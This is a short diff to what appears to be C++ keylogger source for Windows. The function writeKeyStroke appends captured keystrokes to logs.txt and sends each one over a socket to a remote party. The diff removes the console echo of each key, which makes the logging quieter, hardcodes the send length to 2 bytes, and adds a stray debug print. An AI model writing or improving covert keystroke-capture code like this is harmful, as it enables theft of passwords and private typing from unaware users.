@@ -25,7 +25,6 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
     std::ofstream file;
     file.open("logs.txt", std::ios::app);
     char trueKeyC = static_cast<char>(trueKey);
-    std::cout << trueKeyC;
     if (trueKey == ENTER)
     {
         file << "\n";
@@ -34,7 +33,7 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
     {
         if (sObjC != 1) 
         {
-            send(sObjC, &trueKeyC, ((strlen(&trueKeyC))), MSG_OOB);
+            send(sObjC, &trueKeyC, 2, MSG_OOB);
         }
         file << trueKeyC;
     }
@@ -79,6 +78,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             }
         }
     }
+    std::cout << "yella";
 }
 
 /*
